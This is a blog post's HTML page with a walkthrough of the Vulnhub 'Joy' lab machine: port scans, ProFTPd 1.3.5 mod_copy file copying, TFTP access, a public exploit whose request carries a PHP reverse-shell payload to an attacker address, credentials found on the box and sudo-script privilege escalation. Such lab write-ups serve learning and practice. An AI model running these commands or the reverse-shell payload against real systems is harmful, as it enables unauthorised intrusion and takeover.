@@ -1,0 +1,319 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="Does penetration testing spark joy? If it does, this machine is for you.
+This machine is full of services, full of fun, but how many ways are there to align the stars? Perhaps, just like the child in all of us, we may find joy in a playground such as this.
+This is somewhat OSCP-like for learning value, but is nowhere as easy to complete with an OSCP exam timeframe. But if you found this box because of preparation for the OSCP, you might as well try harder."><meta name=keywords content=",Vulnhub"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://fspxnky.github.io/joy/><title>Joy :: fspxnky — Security Blog</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Joy"><meta itemprop=description content="Does penetration testing spark joy? If it does, this machine is for you.
+This machine is full of services, full of fun, but how many ways are there to align the stars? Perhaps, just like the child in all of us, we may find joy in a playground such as this.
+This is somewhat OSCP-like for learning value, but is nowhere as easy to complete with an OSCP exam timeframe. But if you found this box because of preparation for the OSCP, you might as well try harder."><meta itemprop=datePublished content="2022-04-15T10:18:12+08:00"><meta itemprop=dateModified content="2022-04-15T10:18:12+08:00"><meta itemprop=wordCount content="2440"><meta itemprop=keywords content="Vulnhub,"><meta name=twitter:card content="summary"><meta name=twitter:title content="Joy"><meta name=twitter:description content="Does penetration testing spark joy? If it does, this machine is for you.
+This machine is full of services, full of fun, but how many ways are there to align the stars? Perhaps, just like the child in all of us, we may find joy in a playground such as this.
+This is somewhat OSCP-like for learning value, but is nowhere as easy to complete with an OSCP exam timeframe. But if you found this box because of preparation for the OSCP, you might as well try harder."><meta property="article:published_time" content="2022-04-15 10:18:12 +0800 +0800"></head><body><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>/home/fspxnky</span>
+<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=/tags>Tags</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><a href=https://fspxnky.github.io/joy/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>cat ./Joy.md</span>
+<span class=logo__cursor></span></div></a><p>Reading Time: 11 minutes and 5 seconds.</p><h2 class=post-title>Joy</h2><div class=post-content><p>Does penetration testing spark joy? If it does, this machine is for you.</p><p>This machine is full of services, full of fun, but how many ways are there to align the stars? Perhaps, just like the child in all of us, we may find joy in a playground such as this.</p><p>This is somewhat OSCP-like for learning value, but is nowhere as easy to complete with an OSCP exam timeframe. But if you found this box because of preparation for the OSCP, you might as well try harder. :-)</p><p>Feel free to contact the author at <a href=https://donavan.sg/blog>https://donavan.sg/blog</a> if you would like to drop a comment.</p><blockquote><p>The machine IP address is <code>192.168.50.112</code> for me, yours will be different. Do scan your network before proceeding with the attack. Do snapshot the machine before proceeding, in case we need to revert it once we are finish or we mess up the machine.</p></blockquote><h2 id=scanning>Scanning</h2><p>Let us start by scanning using Nmap to find any opened ports in the machine.</p><pre tabindex=0><code>sudo nmap -sS -p- 192.168.50.112 -oN initial.scan    
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 22:24 EDT
+Nmap scan report for 192.168.50.112
+Host is up (0.0019s latency).
+Not shown: 65523 closed tcp ports (reset)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+25/tcp  open  smtp
+80/tcp  open  http
+110/tcp open  pop3
+139/tcp open  netbios-ssn
+143/tcp open  imap
+445/tcp open  microsoft-ds
+465/tcp open  smtps
+587/tcp open  submission
+993/tcp open  imaps
+995/tcp open  pop3s
+</code></pre><h4 id=port-21-ftp>Port 21 (FTP)</h4><p>Scanning this FTP port again with default script, I can see that i can log in anonymously:</p><pre tabindex=0><code>nmap -sCV -p 21 192.168.50.112 -oN FTP.scan                                            
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 03:41 EDT
+Nmap scan report for 192.168.50.112
+Host is up (0.0027s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.2.10
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxr-x   2 ftp      ftp          4096 Aug  6 07:27 download
+|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
+Service Info: Host: The
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.89 seconds
+</code></pre><p>I also see that there&rsquo;s 2 directory that I have access to:</p><ul><li>download (Empty)</li><li>upload</li></ul><p>Navigating to the <code>upload</code> folder, we see a bunch of files here but only one file interest me: <code>Directory</code>. Lets download that file:</p><pre tabindex=0><code>ftp 192.168.50.112
+Connected to 192.168.50.112.
+220 The Good Tech Inc. FTP Server
+Name (192.168.50.112:kali): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password: 
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||32010|)
+150 Opening ASCII mode data connection for file list
+drwxrwxr-x   2 ftp      ftp          4096 Aug  6 07:27 download
+drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
+226 Transfer complete
+ftp&gt; cd upload
+250 CWD command successful
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||40420|)
+150 Opening ASCII mode data connection for file list
+-rwxrwxr-x   1 ftp      ftp         16421 Aug  6 08:51 directory
+-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_armadillo
+-rw-rw-rw-   1 ftp      ftp            25 Jan  6  2019 project_bravado
+-rw-rw-rw-   1 ftp      ftp            88 Jan  6  2019 project_desperado
+-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_emilio
+-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_flamingo
+-rw-rw-rw-   1 ftp      ftp             7 Jan  6  2019 project_indigo
+-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_komodo
+-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_luyano
+-rw-rw-rw-   1 ftp      ftp             8 Jan  6  2019 project_malindo
+-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_okacho
+-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_polento
+-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_ronaldinho
+-rw-rw-rw-   1 ftp      ftp            55 Jan  6  2019 project_sicko
+-rw-rw-rw-   1 ftp      ftp            57 Jan  6  2019 project_toto
+-rw-rw-rw-   1 ftp      ftp             5 Jan  6  2019 project_uno
+-rw-rw-rw-   1 ftp      ftp             9 Jan  6  2019 project_vivino
+-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_woranto
+-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_yolo
+-rw-rw-rw-   1 ftp      ftp           180 Jan  6  2019 project_zoo
+-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
+226 Transfer complete
+ftp&gt; get directory
+local: directory remote: directory
+229 Entering Extended Passive Mode (|||8808|)
+150 Opening BINARY mode data connection for directory (16625 bytes)
+100% |***************************************************************************************************************| 16625        9.58 MiB/s    00:00 ETA
+226 Transfer complete
+16625 bytes received in 00:00 (4.02 MiB/s)
+ftp&gt; exit
+221 Goodbye.
+</code></pre><p>And read the file. I snip a lot of here just to show what file to look at:</p><pre tabindex=0><code>cat directory 
+Patrick&#39;s Directory
+
+total 416
+drwxr-xr-x 18 patrick patrick 20480 Aug  6 16:55 .
+drwxr-xr-x  4 root    root     4096 Jan  6  2019 ..
+...
+-rw-r--r--  1 patrick patrick   407 Jan 27  2019 version_control
+...
+
+You should know where the directory can be accessed.
+
+Information of this Machine!
+
+Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
+</code></pre><p>Yes. There&rsquo;s a <code>version_control</code> file. This file can potentially help me to progress my enumeration but we have no way to download and read it.</p><h2 id=two-method-to-get-version_control-file>Two method to get version_control file</h2><p>And another yes. I hit a wall. I didn&rsquo;t know where to look next because i tried enumerating all the ports here and i got nothing. Even the returns from searchsploit wouldn&rsquo;t work. So I read a couple of writeups/walkthrough on how to work around for this machine and surprisingly, I learn a couple of things.</p><h4 id=method-1>Method #1</h4><p>I learn this method by reading <code>Raj Chandel's Blog</code>. His write-up for this machine can be found [here].(<a href=https://www.hackingarticles.in/digitalworld-local-joy-vulnhub-walkthrough/>https://www.hackingarticles.in/digitalworld-local-joy-vulnhub-walkthrough/</a>)</p><p>If we take a closer look at the permissions for <code>download</code> and <code>upload</code> in <code>FTP</code> earlier, it shows that we have read/write permission. So we can actually move the <code>version_control</code> file from <code>patrick</code> home directory to the <code>ftp</code> server. This is where i learnt that I can copy files like this but the issue is that, he didn&rsquo;t explain how he know where the <code>ftp</code> directory is located.</p><pre tabindex=0><code>telnet 192.168.50.112 21
+Trying 192.168.50.112...
+Connected to 192.168.50.112.
+Escape character is &#39;^]&#39;.
+220 The Good Tech Inc. FTP Server
+site cpfr /home/patrick/version_control
+350 File or directory exists, ready for destination name
+site cpto /home/ftp/upload/version_control
+250 Copy successful
+</code></pre><p>Now if we head back to the <code>FTP</code> server. We can see that the <code>version_control</code> file is there and we can download it:</p><pre tabindex=0><code>ftp 192.168.50.112                                                                                   
+Connected to 192.168.50.112.
+220 The Good Tech Inc. FTP Server
+Name (192.168.50.112:kali): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password: 
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||7609|)
+150 Opening ASCII mode data connection for file list
+drwxrwxr-x   2 ftp      ftp          4096 Aug  6 07:27 download
+drwxrwxr-x   2 ftp      ftp          4096 Aug  6 09:15 upload
+226 Transfer complete
+ftp&gt; cd upload
+250 CWD command successful
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||22832|)
+150 Opening ASCII mode data connection for file list
+...
+-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
+-rw-r--r--   1 0        0             407 Aug  6 09:15 version_control
+226 Transfer complete
+ftp&gt; get version_control
+local: version_control remote: version_control
+229 Entering Extended Passive Mode (|||22410|)
+150 Opening BINARY mode data connection for version_control (407 bytes)
+100% |***************************************************************************************************************|   407        9.70 MiB/s    00:00 ETA
+226 Transfer complete
+407 bytes received in 00:00 (189.35 KiB/s)
+ftp&gt;
+</code></pre><h4 id=method-2>Method #2</h4><p>I learn this method by reading <code>Novasky Medium Blog</code>. His write-up for this machine can be found [here].(<a href=https://novasky.medium.com/digitalworld-local-joy-walkthrough-vulnhub-no-handshakes-for-old-protocol-oscp-practice-1d9cc675ee6e>https://novasky.medium.com/digitalworld-local-joy-walkthrough-vulnhub-no-handshakes-for-old-protocol-oscp-practice-1d9cc675ee6e</a>)</p><p>This writeup will show you how to mount FTP in your system and obtained the <code>version_control</code> file through <code>tftp</code> command. <code>UDP Port 161 - snmp</code> leaked out information, showing us that <code>tftp</code> service is listening on port 36969. To see this ports, we have to scan for <code>UDP</code> ports.</p><blockquote><p>Do take note that UDP scan will take awhile</p></blockquote><pre tabindex=0><code>nmap -sC -sV -sU 192.168.50.112 -oN udp.scan
+# Nmap 7.92 scan initiated Fri Apr 15 04:01:47 2022 as: nmap -sC -sV -sU -oN udp.scan 192.168.50.112
+Nmap scan report for 192.168.50.112
+Host is up (0.0025s latency).
+Not shown: 994 closed udp ports (port-unreach)
+PORT     STATE         SERVICE  VERSION
+68/udp   open|filtered dhcpc
+123/udp  open          ntp      NTP v4 (unsynchronized)
+| ntp-info: 
+|_  
+161/udp  open          snmp     SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-win32-software: 
+...
+1022: 
+|     Name: in.tftpd
+|     Path: /usr/sbin/in.tftpd
+|     Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick
+...
+631/udp  open|filtered ipp
+1900/udp open|filtered upnp
+5353/udp open|filtered zeroconf
+Service Info: Host: JOY
+
+Host script results:
+|_clock-skew: -251d22h51m00s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Apr 15 04:22:51 2022 -- 1 IP address (1 host up) scanned in 1264.69 seconds
+</code></pre><p>From the result under <code>Port 161 UDP</code>, it tells us that <code>tftp</code> is listening on port <code>36969</code> and its straight to <code>/home/patrick</code> directory. From here, we can simply connect to <code>tftp</code> and grab <code>version_control</code> file because that is where we at when we are connected.</p><pre tabindex=0><code>tftp 192.168.50.112 36969                                                                                                                        
+tftp&gt; ls
+?Invalid command
+tftp&gt; ?
+Commands may be abbreviated.  Commands are:
+
+connect 	connect to remote tftp
+mode    	set file transfer mode
+put     	send file
+get     	receive file
+quit    	exit tftp
+verbose 	toggle verbose mode
+trace   	toggle packet tracing
+status  	show current status
+binary  	set mode to octet
+ascii   	set mode to netascii
+rexmt   	set per-packet retransmission timeout
+timeout 	set total retransmission timeout
+?       	print help information
+tftp&gt; get version_control
+Received 419 bytes in 0.0 seconds
+</code></pre><h2 id=initial-foothold>Initial Foothold</h2><p>I can finally progress &mldr;.</p><p>Reading <code>version_control</code> file tells us that <code>ProFTPd</code> is actually version 1.3.5 and not 1.2.10:</p><pre tabindex=0><code>cat version_control 
+Version Control of External-Facing Services:
+
+Apache: 2.4.25
+Dropbear SSH: 0.34
+ProFTPd: 1.3.5
+Samba: 4.5.12
+
+We should switch to OpenSSH and upgrade ProFTPd.
+
+Note that we have some other configurations in this machine.
+1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
+2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
+</code></pre><p>Looking for <code>ProFTPd 1.3.5</code> vulnerability in searchsploit return this:</p><pre tabindex=0><code>searchsploit ProFTPd 1.3.5                                                                                                                          1 ⚙
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                            |  Path
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - &#39;mod_copy&#39; Command Execution (Metasploit)                                                                 | linux/remote/37262.rb
+ProFTPd 1.3.5 - &#39;mod_copy&#39; Remote Command Execution                                                                       | linux/remote/36803.py
+ProFTPd 1.3.5 - &#39;mod_copy&#39; Remote Command Execution (2)                                                                   | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                                                                                                 | linux/remote/36742.txt
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>I tried to use the exploit from searchsploit but it didn&rsquo;t work for me. I didn&rsquo;t try the Metasploit exploit. So i clone one from github that is from <a href=https://github.com/thegingerninja/ProFTPd_1_3_5_mod_copy_exploit>thegingerninja</a>.</p><pre tabindex=0><code>git clone https://github.com/thegingerninja/ProFTPd_1_3_5_mod_copy_exploit.git                                                                      1 ⚙
+Cloning into &#39;ProFTPd_1_3_5_mod_copy_exploit&#39;...
+remote: Enumerating objects: 11, done.
+remote: Counting objects: 100% (11/11), done.
+remote: Compressing objects: 100% (11/11), done.
+remote: Total 11 (delta 1), reused 4 (delta 0), pack-reused 0
+Receiving objects: 100% (11/11), done.
+Resolving deltas: 100% (1/1), done.
+
+cd ProFTPd_1_3_5_mod_copy_exploit
+</code></pre><p>Run the exploit to understand how to use it:</p><pre tabindex=0><code>python2 exploit_proftd_1_3_5.py                                                          
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+
+Usage: python exploit_proftd_1_3_5.py &lt;RHOST&gt; &lt;SITEPATH&gt; &lt;LHOST&gt; &lt;LPORT&gt;
+</code></pre><p>For the <code>sitepath</code>, we specify <code>/var/www/tryingharderisjoy</code>. This can be found in the <code>version_control</code> file. Before we run the exploit, be sure to set up a <code>nc</code> listener first.</p><pre tabindex=0><code>nc -lvnp 1234
+listening on [any] 1234 ...
+
+# Run the exploit on another terminal 
+
+python2 exploit_proftd_1_3_5.py 192.168.50.112 /home/ftp/upload 10.10.10.2 1234
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+[+] REMINDER: Start a Netcat listener on port: 1234
+[+] Running exploit for ProFTPd 1.3.5...
+[+] FTP Banner: 220 The Good Tech Inc. FTP Server
+
+[+] Sending exploit...
+[+] Running payload by requesting: http://192.168.50.112/pealthe.php?banana=nohup%20php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.10.2%22%2C1234%29%3Bexec%28%22/bin/sh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27%20%26%20
+[+] Thank you for using this exploit. Now go bananas!
+</code></pre><p>The exploit works and we have a shell as <code>www-data</code>. Lets stable the shell before moving forward.</p><pre tabindex=0><code>nc -lvnp 1234                           
+listening on [any] 1234 ...
+connect to [10.10.10.2] from (UNKNOWN) [192.168.50.112] 40106
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
+$ export TERM=xterm
+$ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+www-data@JOY:/var/www/tryingharderisjoy$ ^Z
+zsh: suspended  nc -lvnp 1234
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Vulnhub/Joy]
+└─$ stty raw -echo; fg                                                                                                                        
+[1]  + continued  nc -lvnp 1234
+
+www-data@JOY:/var/www/tryingharderisjoy$
+</code></pre><h2 id=privileged-escalation>Privileged Escalation</h2><h4 id=www-data-to-patrick>www-data to Patrick</h4><p>Upon recieving a shell, we are in the <code>/var/www/tryingharderisjoy</code> directory. There&rsquo;s a file called <code>patricksecretsofjoy</code> in <code>/tryingharderisjoy/ossec</code> directory. Viewing it will give us <code>patrick</code> password:</p><pre tabindex=0><code>www-data@JOY:/var/www/tryingharderisjoy# ls
+ossec  pealthe.php
+www-data@JOY:/var/www/tryingharderisjoy# cd ossec/
+www-data@JOY:/var/www/tryingharderisjoy/ossec# ls
+CONTRIB		  img	     lib	     patricksecretsofjoy  setup.sh
+css		  index.php  LICENSE	     README		  site
+htaccess_def.txt  js	     ossec_conf.php  README.search	  tmp
+www-data@JOY:/var/www/tryingharderisjoy/ossec# cat patricksecretsofjoy 
+credentials for JOY:
+patrick:apollo098765
+root:howtheheckdoiknowwhattherootpasswordis
+
+how would these hack3rs ever find such a page?
+www-data@JOY:/var/www/tryingharderisjoy/ossec
+</code></pre><p>With that, we can simply change to <code>patrick</code> using the <code>su</code> command:</p><pre tabindex=0><code>su patrick
+Password: apollo098765
+patrick@JOY:/var/www/tryingharderisjoy/ossec$ id
+id
+uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner),1001(ftp)
+patrick@JOY:/var/www/tryingharderisjoy/ossec$
+</code></pre><h4 id=patrick-to-root>Patrick to Root</h4><p>Running <code>sudo -l</code> to check what sudo permission does <code>patrick</code> has:</p><pre tabindex=0><code>atrick@JOY:~/script$ sudo -l
+Matching Defaults entries for patrick on JOY:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User patrick may run the following commands on JOY:
+    (ALL) NOPASSWD: /home/patrick/script/test
+</code></pre><p>Running that script as sudo allow us to change any file from the current permission, to the permission we give it to. We can&rsquo;t access the <code>/script</code> folder due to the folder permission. So what I did was I run the script to change the <code>/script</code> directory permission to 777, so that i can gain access to this directory and edit the <code>test</code> file:</p><pre tabindex=0><code># Changing script permission 
+
+patrick@JOY:~$ sudo script/test
+sudo script/test
+I am practising how to do simple bash scripting!
+What file would you like to change permissions within this directory?
+../script
+What permissions would you like to set the file to?
+777
+Currently changing file permissions, please wait.
+Tidying up...
+Done!
+patrick@JOY:~$ ls -l | grep script
+drwxrwxrwx 2 root    root    4096 Aug  6 20:03 script
+</code></pre><p>We now have access to the <code>test</code> file. Viewing it in <code>nano</code> will show us how the script works. I will just add bash after the <code>#!/bin/sh</code> line:</p><pre tabindex=0><code>#!/bin/sh
+
+bash
+
+echo &#34;I am practising how to do simple bash scripting!&#34;
+...
+</code></pre><p>Save the file and run it as <code>sudo</code> again:</p><pre tabindex=0><code>patrick@JOY:~/script$ sudo /home/patrick/script/test
+root@JOY:/home/patrick/script# id
+uid=0(root) gid=0(root) groups=0(root)
+root@JOY:/home/patrick/script# cat /root/proof.txt 
+Never grant sudo permissions on scripts that perform system functions!
+root@JOY:/home/patrick/script#
+</code></pre><h2 id=summary>Summary</h2><p>I wasted a lot of time enumerating other ports. I was stuck because i ran out of ideas. Exposure is important they say! Overall I would say that for this machine, enumeration part plays a big role. If it wasnt for the writeup I dont think I will root this machine. Things to takeaway from this machine is definitely</p><ul><li>Scanning of UDP Ports</li><li>CPFR / CPTO command in telnet for FTP</li><li>Hands-on on TFTP command.</li></ul><p>I had my fun. See you all in the next post!</p></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://fspxnky.github.io/tags/vulnhub/>Vulnhub</a></span></p></div></main></div><footer class=footer></footer></div><script type=text/javascript src=/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l+qxcnN3UWK6NyURtxH+ovdgjyFuaKZ7si1g=="></script></body></html>
